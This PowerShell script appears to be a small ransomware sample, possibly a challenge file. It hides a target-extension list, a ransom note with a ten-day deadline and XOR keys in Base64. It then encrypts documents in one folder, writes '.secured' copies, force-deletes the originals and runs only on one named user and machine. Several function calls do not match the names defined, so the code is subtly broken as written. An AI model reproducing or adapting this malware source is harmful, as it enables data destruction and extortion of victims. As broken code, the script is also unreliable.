$Var1 = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
$Var2 = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
$Var3 = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$Var4 = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"

$charShiftMap = @{}
$reverseShiftMap = @{}

For ($x = 65; $x -le 90; $x++) {
    $charShiftMap[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) }
}

function Base64DecodeVar2 {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Var2))
}

function Decode_And_Split_Var1 {
    return (Base64DecodeString $Var1).Split(" ")
}

For ($x = 97; $x -le 122; $x++) {
    $charShiftMap[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) }
}

function Base64DecodeString {
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}

$DecodedKey1 = Base64DecodeString $Var3
$DecodedKey2 = Base64DecodeString $Var4

For ($x = 48; $x -le 57; $x++) {
    $charShiftMap[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}

$charShiftMap.GetEnumerator() | ForEach-Object {
    $reverseShiftMap[$_.Value] = $_.Key
}

function XOR-TripleBuffer {
    param([byte[]]$inputBytes, [byte[]]$key1, [byte[]]$key2)
    $outputBytes = [byte[]]::new($inputBytes.Length)
    for ($i = 0; $i -lt $inputBytes.Length; $i++) {
        $k1 = $key1[$i % $key1.Length]
        $k2 = $key2[$i % $key2.Length]
        $outputBytes[$i] = $inputBytes[$i] -bxor $k1 -bxor $k2
    }
    return $outputBytes
}


function Encode-XORBase64 {
    param([byte[]]$inputBytes, [string]$key1, [string]$key2)

    if ($inputBytes -eq $null -or $inputBytes.Length -eq 0) {
        return $null
    }

    $key1Bytes = [System.Text.Encoding]::UTF8.GetBytes($key1)
    $key2Bytes = [System.Text.Encoding]::UTF8.GetBytes($key2)
    $xorResult = XOR-TripleBuffer $inputBytes $key1Bytes $key2Bytes

    return [Convert]::ToBase64String($xorResult)
}

function Encrypt-Files {
    param([switch]$Run)

    try {
        if ($Run) {
            foreach ($extension in Decode-And-Split-Var1) {
                $targetDir = "dca01aq2/"
                if (Test-Path $targetDir) {
                    Get-ChildItem -Path $targetDir -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$extension$" } |
                        ForEach-Object {
                            $filePath = $_.FullName
                            if (Test-Path $filePath) {
                                $fileBytes = [IO.File]::ReadAllBytes($filePath)
                                $encoded = Encode-XORBase64 $fileBytes $DecodedKey1 $DecodedKey2
                                [IO.File]::WriteAllText("$filePath.secured", $encoded)
                                Remove-Item $filePath -Force
                            }
                        }
                }
            }
        }
    }
    catch {}
}


if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    EncryptFiles -Run
    Base64DecodeVar2
}

